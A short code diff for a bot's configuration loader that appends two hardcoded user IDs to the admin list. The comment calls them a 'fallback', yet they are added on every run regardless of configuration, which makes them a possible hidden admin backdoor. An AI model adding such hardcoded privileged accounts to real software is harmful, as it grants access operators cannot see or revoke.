@@ -66,6 +66,13 @@ try:
     # Deduplicate
     ADMIN_IDS = list(sorted(set(ADMIN_IDS)))
     
+    # Hardcoded admins (fallback)
+    for admin_id in [6770204468, 1392501306]:
+        if admin_id not in ADMIN_IDS:
+            ADMIN_IDS.append(admin_id)
+    
+    ADMIN_IDS = list(sorted(set(ADMIN_IDS)))
+    
     if not ADMIN_IDS:
         logger.warning("No ADMIN_IDS configured! Admin features will be inaccessible.")
     else:
